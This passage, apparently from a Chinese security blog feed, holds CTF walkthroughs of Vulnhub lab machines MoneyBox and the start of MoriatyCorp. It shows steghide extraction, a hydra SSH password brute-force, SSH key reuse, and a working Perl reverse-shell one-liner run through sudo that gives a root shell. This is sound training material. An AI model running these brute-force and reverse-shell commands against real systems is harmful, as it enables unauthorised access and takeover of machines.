class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ steghide info trytofind.jpg </span><br><span class="line">&quot;trytofind.jpg&quot;:</span><br><span class="line">  format: jpeg</span><br><span class="line">  capacity: 64.2 KB</span><br><span class="line">Try to get information about embedded data ? (y/n) y</span><br><span class="line">Enter passphrase: </span><br><span class="line">  embedded file &quot;data.txt&quot;:</span><br><span class="line">    size: 136.0 Byte</span><br><span class="line">    encrypted: no</span><br><span class="line">    compressed: no</span><br></pre></td></tr></table></figure><p><code>可以看到图片中存在一个data.txt文件，把他提取出来。根据提示，renu用户存在弱口令</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ steghide extract -sf trytofind.jpg</span><br><span class="line">Enter passphrase: </span><br><span class="line">wrote extracted data to &quot;data.txt&quot;.</span><br><span class="line">                                                                                            </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ cat data.txt     </span><br><span class="line">Hello.....  renu</span><br><span class="line"></span><br><span class="line">      I tell you something Important.Your Password is too Week So Change Your Password</span><br><span class="line">Don&#x27;t Underestimate it.......</span><br><span class="line"></span><br><span class="line">                              </span><br></pre></td></tr></table></figure><h2 id="0x06-爆破renu"><a href="#0x06-爆破renu" class="headerlink" title="0x06.爆破renu"></a>0x06.爆破renu</h2><p><code>根据提示信息，对renu进行爆破，得到密码为987654321</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ hydra -l renu -P ./rockyou.txt ssh://192.168.56.103</span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-26 04:00:35</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.56.103:22/</span><br><span class="line">[22][ssh] host: 192.168.56.103   login: renu   password: 987654321</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">[WARNING] Writing restore file because 5 final worker threads did not complete until end.</span><br><span class="line">[ERROR] 5 targets did not resolve or could not be connected</span><br><span class="line">[ERROR] 0 target did not complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-26 04:00:56</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ssh登入，这样就得到了第一条flag</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ssh renu@192.168.56.103                                                           255 ⨯</span><br><span class="line">The authenticity of host &#x27;192.168.56.103 (192.168.56.103)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:8GzSoXjLv35yJ7cQf1EE0rFBb9kLK/K1hAjzK/IXk8I.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.56.103&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">renu@192.168.56.103&#x27;s password: </span><br><span class="line">Linux MoneyBox 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Fri Feb 26 08:53:43 2021 from 192.168.43.44</span><br><span class="line">renu@MoneyBox:~$ ls</span><br><span class="line">ftp  user1.txt</span><br><span class="line">renu@MoneyBox:~$ cat user1.txt </span><br><span class="line">Yes...!</span><br><span class="line">You Got it User1 Flag</span><br><span class="line"></span><br><span class="line"> ==&gt; us3r1&#123;F14g:0ku74tbd3777y4&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x07-切换到lily用户"><a href="#0x07-切换到lily用户" class="headerlink" title="0x07.切换到lily用户"></a>0x07.切换到lily用户</h2><p><code>登入到renu用户后，查看renu是否有sudo权限，进行提权，可惜他没有。但查看history可以发现一些利用信息</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">renu@MoneyBox:~$ sudo -s</span><br><span class="line">[sudo] password for renu: </span><br><span class="line">renu is not in the sudoers file.  This incident will be reported.</span><br><span class="line">renu@MoneyBox:~$ history </span><br><span class="line">    1  cler</span><br><span class="line">    2  ls</span><br><span class="line">    3  ls -la</span><br><span class="line">    4  cd /home</span><br><span class="line">    5  ls</span><br><span class="line">    6  clear</span><br><span class="line">    7  cd</span><br><span class="line">    8  ls</span><br><span class="line">    9  ls -la</span><br><span class="line">   10  exit</span><br><span class="line">   11  clear</span><br><span class="line">   12  ls</span><br><span class="line">   13  ls -la</span><br><span class="line">   14  cd /home</span><br><span class="line">   15  ls</span><br><span class="line">   16  cd lily</span><br><span class="line">   17  ls</span><br><span class="line">   18  ls -la</span><br><span class="line">   19  clear</span><br><span class="line">   20  cd</span><br><span class="line">   21  clear</span><br><span class="line">   22  ssh-keygen -t rsa</span><br><span class="line">   23  clear</span><br><span class="line">   24  cd .ssh</span><br><span class="line">   25  ls</span><br><span class="line">   26  ssh-copy-id lily@192.168.43.80</span><br><span class="line">   27  clear</span><br><span class="line">   28  cd</span><br><span class="line">   29  cd -</span><br><span class="line">   30  ls -l</span><br><span class="line">   31  chmod 400 id_rsa</span><br><span class="line">   32  ls -l</span><br><span class="line">   33  ssh -i id_rsa lily@192.168.43.80</span><br><span class="line">   34  clear</span><br><span class="line">   35  ssh -i id_rsa lily@192.168.43.80</span><br><span class="line">   36  cd</span><br><span class="line">   37  clear</span><br><span class="line">   38  cd .ssh/</span><br><span class="line">   39  ls</span><br><span class="line">   40  ssh -i id_rsa lily@192.168.43.80</span><br><span class="line">   41  su lily</span><br><span class="line">   42  clear</span><br><span class="line">   43  cd</span><br><span class="line">   44  sudo apt install openssh</span><br><span class="line">   45  sudo apt update</span><br><span class="line">   46  sudo apt install openssh-server</span><br><span class="line">   47  sudo service ssh start</span><br><span class="line">   48  sudo service ssh status</span><br><span class="line">   49  clear</span><br><span class="line">   50  cd /etc/</span><br><span class="line">   51  ls</span><br><span class="line">   52  cd ssh</span><br><span class="line">   53  ls</span><br><span class="line">   54  nano ssh_config </span><br><span class="line">   55  ls</span><br><span class="line">   56  nano sshd_config </span><br><span class="line">   57  clear</span><br><span class="line">   58  cd</span><br><span class="line">   59  ls</span><br><span class="line">   60  ls -la</span><br><span class="line">   61  chsh bash</span><br><span class="line">   62  chsh</span><br><span class="line">   63  clear</span><br><span class="line">   64  su root</span><br><span class="line">   65  clear</span><br><span class="line">   66  sudo apt install openssh</span><br><span class="line">   67  su root</span><br><span class="line">   68  exit</span><br><span class="line">   69  ls</span><br><span class="line">   70  cat user1.txt </span><br><span class="line">renu@MoneyBox:~$</span><br></pre></td></tr></table></figure><p><code>根据历史信息，我们可以发现，renu用户生成了ssh公钥并复制到了lily用户的.ssh目录下，接着renu使用私钥登入到了lily用户下。并且当前服务器也存在一个lily用户，那么我们发现的lily用户是否是当前服务器上的lily呢？答案是YES。登入后得到第二个flag</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">renu@MoneyBox:~/.ssh$ ssh -i id_rsa lily@192.168.56.103</span><br><span class="line">Linux MoneyBox 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sun Oct 24 06:32:41 2021 from 192.168.56.103</span><br><span class="line">lily@MoneyBox:~$ whoami</span><br><span class="line">lily</span><br><span class="line">lily@MoneyBox:~$ id</span><br><span class="line">uid=1000(lily) gid=1000(lily) groups=1000(lily),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)</span><br><span class="line">lily@MoneyBox:~$ ls</span><br><span class="line">user2.txt</span><br><span class="line">lily@MoneyBox:~$ cat user2.txt </span><br><span class="line">Yeah.....</span><br><span class="line">You Got a User2 Flag</span><br><span class="line"></span><br><span class="line">==&gt; us3r&#123;F14g:tr5827r5wu6nklao&#125;</span><br><span class="line"></span><br><span class="line">lily@MoneyBox:~$</span><br></pre></td></tr></table></figure><h2 id="0x08-提权"><a href="#0x08-提权" class="headerlink" title="0x08.提权"></a>0x08.提权</h2><p><code>根据vulnhub的套路，第三个flag一定在root用户下。查看history，发现lily用户查找过具有suid权限的文件，但是并没有。然而lily用户存在sudo权限</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">lily@MoneyBox:~$ history </span><br><span class="line">    1  whoami</span><br><span class="line">    2  exit</span><br><span class="line">    3  sudo -l</span><br><span class="line">    4  clear</span><br><span class="line">    5  find / -type f -user lily -perm 4000</span><br><span class="line">    6  find / -type f -user lily -perm 4000 2&gt;/dev/null</span><br><span class="line">    7  find / -type f -user root -perm 4000 2&gt;/dev/null</span><br><span class="line">    8  exit</span><br><span class="line">    9  find / -type f -user root -perm 4000 2&gt;/dev/null</span><br><span class="line">   10  find / -type f -user lily -perm 4000 2&gt;/dev/null</span><br><span class="line">   11  find / -type f -user lily -perm 4000 </span><br><span class="line">   12  clear</span><br><span class="line">   13  find / -type f -user lily -perm 4000 2&gt;/dev/null</span><br><span class="line">   14  exit</span><br><span class="line">   15  find / -type f -user lily -perm 4000 2&gt;/dev/null</span><br><span class="line">   16  find / -type f -root lily -perm 4000 2&gt;/dev/null</span><br><span class="line">   17  sudo -l</span><br><span class="line">   18  clear</span><br><span class="line">   19  exit</span><br><span class="line">   20  sudo -l</span><br><span class="line">   21  clear</span><br><span class="line">   22  exit</span><br><span class="line">   23  cd</span><br><span class="line">   24  clear</span><br><span class="line">   25  su renu</span><br><span class="line">   26  clear</span><br><span class="line">   27  cd /usr/bin/</span><br><span class="line">   28  ls</span><br><span class="line">   29  ls ping</span><br><span class="line">   30  ls -l ping</span><br><span class="line">   31  chmod u+s ping</span><br><span class="line">   32  chmod -u+s ping</span><br><span class="line">   33  ls -l ping</span><br><span class="line">   34  sudo chmod -u+s ping</span><br><span class="line">   35  ls -l ping</span><br><span class="line">   36  sudo chmod u+r ping</span><br><span class="line">   37  sudo chmod u+w ping</span><br><span class="line">   38  ls -l ping</span><br><span class="line">   39  sudo chmod g-s ping</span><br><span class="line">   40  ls -l ping</span><br><span class="line">   41  apt update</span><br><span class="line">   42  sudo apt update</span><br><span class="line">   43  ls</span><br><span class="line">   44  ls -l whoami</span><br><span class="line">   45  sudo chmod 400 ping</span><br><span class="line">   46  sudo chmod u+x ping</span><br><span class="line">   47  ls -l ping</span><br><span class="line">   48  clear</span><br><span class="line">   49  cd</span><br><span class="line">   50  cd /etc/</span><br><span class="line">   51  nano sudoers</span><br><span class="line">   52  sudo nano sudoers</span><br><span class="line">   53  cd /usr/bin</span><br><span class="line">   54  ls nano</span><br><span class="line">   55  ls more</span><br><span class="line">   56  clear</span><br><span class="line">   57  cd /etc/</span><br><span class="line">   58  sudo nano sudoers</span><br><span class="line">   59  su root</span><br><span class="line">   60  ls</span><br><span class="line">   61  ls -la</span><br><span class="line">   62  clear</span><br><span class="line">   63  ls -la</span><br><span class="line">   64  nano user2.txt</span><br><span class="line">   65  ls</span><br><span class="line">   66  cat user2.txt </span><br><span class="line">   67  exit</span><br><span class="line">   68  ls</span><br><span class="line">   69  cat user2.txt </span><br><span class="line">   70  exit</span><br><span class="line">   71  whoami</span><br><span class="line">   72  id</span><br><span class="line">   73  ls</span><br><span class="line">   74  cat user2.txt </span><br><span class="line">   75  sudo -s</span><br><span class="line">   76  history </span><br><span class="line">lily@MoneyBox:~$</span><br></pre></td></tr></table></figure><p><code>查看lily用户具有sudo权限的命令，可以发现perl</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lily@MoneyBox:~$ sudo -l</span><br><span class="line">Matching Defaults entries for lily on MoneyBox:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User lily may run the following commands on MoneyBox:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/perl</span><br></pre></td></tr></table></figure><p><code>perl反弹shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;192.168.56.104&quot;;$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure><p><code>得到shell，获得第三个flag</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc -nvlp 6666                                                                       1 ⨯</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.56.104] from (UNKNOWN) [192.168.56.103] 43008</span><br><span class="line"><span class="meta">#</span><span class="bash"> id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="meta">#</span><span class="bash"> whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="meta">#</span><span class="bash"> ls </span></span><br><span class="line">user2.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">pwd</span></span></span><br><span class="line">/home/lily</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /root</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ls -l</span></span><br><span class="line">total 0</span><br><span class="line"><span class="meta">#</span><span class="bash"> ls -la</span></span><br><span class="line">total 28</span><br><span class="line">drwx------  3 root root 4096 Feb 26  2021 .</span><br><span class="line">drwxr-xr-x 18 root root 4096 Feb 25  2021 ..</span><br><span class="line">-rw-------  1 root root 2097 Feb 26  2021 .bash_history</span><br><span class="line">-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc</span><br><span class="line">drwxr-xr-x  3 root root 4096 Feb 25  2021 .local</span><br><span class="line">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</span><br><span class="line">-rw-r--r--  1 root root  228 Feb 26  2021 .root.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat .root.txt</span></span><br><span class="line"></span><br><span class="line">Congratulations.......!</span><br><span class="line"></span><br><span class="line">You Successfully completed MoneyBox</span><br><span class="line"></span><br><span class="line">Finally The Root Flag</span><br><span class="line">    ==&gt; r00t&#123;H4ckth3p14n3t&#125;</span><br><span class="line"></span><br><span class="line">I&#x27;m Kirthik-KarvendhanT</span><br><span class="line">    It&#x27;s My First CTF Box</span><br><span class="line">         </span><br><span class="line">instagram : ____kirthik____</span><br><span class="line"></span><br><span class="line">See You Back....</span><br><span class="line">       </span><br><span class="line"><span class="meta">#</span><span class="bash"> </span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-简述&quot;&gt;&lt;a href=&quot;#0x00-简述&quot; class=&quot;headerlink&quot; title=&quot;0x00.简述&quot;&gt;&lt;/a&gt;0x00.简述&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Difficulty : Easy&lt;/p&gt;
&lt;p&gt;Goal : 3 flags&lt;/p&gt;
&lt;p&gt;一台CTF风靶机。veryveryvery&lt;del&gt;~&lt;/del&gt;ez&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="vulnhub" scheme="https://lunamoore.github.io/categories/vulnhub/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>MoriatyCorp</title>
    <link href="https://lunamoore.github.io/2021/09/19/MoriatyCorp/"/>
    <id>https://lunamoore.github.io/2021/09/19/MoriatyCorp/</id>
    <published>2021-09-19T08:17:12.000Z</published>
    <updated>2021-09-19T08:28:46.127Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-官网描述"><a href="#0x00-官网描述" class="headerlink" title="0x00.官网描述"></a>0x00.官网描述</h2><blockquote><p>Hello Agent.</p><p>You’re here on a special mission.</p><p>A mission to take down one of the biggest weapons suppliers which is Moriarty Corp.</p><p>Enter flag{start} into the webapp to get started!</p><p>Notes:</p><ul><li>Web panel is on port 8000 (not in scope. Don’t attack)</li><li>Flags are stored in #_flag.txt format. Flags are entered in flag{} format. They’re usually stored in / directory but can be in different locations.</li><li>To temporarily stop playing, pause the VM. Do not shut it down.</li><li>The webapp starts docker containers in the background when you add flags. Shutting down and rebooting will mess it up.</li></ul><p>(the story is bad. sorry for the lack of creativity)</p><p>Difficulty: Med-Hard</p></blockquote><a id="more"></a><p><strong>说明</strong></p><p><code>8000端口提交flag端口</code></p><h2 id="0x01-主机发现"><a href="#0x01-主机发现" class="headerlink" title="0x01.主机发现"></a>0x01.主机发现</h2><p><code>使用arp扫描可以发现目标主机为192.168.56.102</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌─[✗]─[user@parrot]─[~]</span><br><span class="line">└──╼ $sudo arp-scan 192.168.56.0/24</span><br><span class="line">[sudo] password for user: </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 08:00:27:00:7c:8d, IPv4: 192.168.56.101</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:0e    (Unknown: locally administered)</span><br><span class="line">192.168.56.100    08:00:27:fd:f0:0e    PCS Systemtechnik GmbH</span><br><span class="line">192.168.56.102    08:00:27:81:9f:44    PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.110 seconds (121.33 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure><h2 id="0x02-端口扫描"><a href="#0x02-端口扫描" class="headerlink" title="0x02.端口扫描"></a>0x02.端口扫描</h2><p><code>可以发现开放了22、8000、9000端口，8000为flag提交端口，9000为docker UI端口</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌─[user@parrot]─[~]</span><br><span class="line">└──╼ $sudo nmap -A 192.168.56.102</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-19 06:06 BST</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report for 192.168.56.102</span><br><span class="line">Host is up (0.0038s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 5a:a7:c8:64:2a:54:bc:64:48:16:2b:79:64:69:cc:45 (RSA)</span><br><span class="line">|   256 89:8d:6a:9b:44:e3:f1:f1:ef:8c:23:13:7a:84:fc:71 (ECDSA)</span><br><span class="line">|_  256 1d:e6:68:27:52:5b:6d:0d:67:5d:30:4c:03:68:b3:2a (ED25519)</span><br><span class="line">8000/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15rc1)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=utf-8).</span><br><span class="line">9000/tcp open  http    Portainer Docker UI 1.19.2</span><br><span class="line">|_http-title: Portainer</span><br><span class="line">MAC Address: 08:00:27:81:9F:44 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   3.78 ms 192.168.56.102</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.55 seconds</span><br></pre></td></tr></table></figure><h2 id="0x03-访问8000端口"><a href="#0x03-访问8000端口" class="headerlink" title="0x03.访问8000端口"></a>0x03.访问8000端口</h2><p><code>提交flag&#123;start&#125;开始任务</code></p><img src="/2021/09/19/MoriatyCorp/image-20210919132104102.png" class><p><code>根据提示访问80端口</code></p><blockquote><p>这里每提交一次flag就会开放下一关的端口，接下来再扫描一下主机。可看到80端口已经打开</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 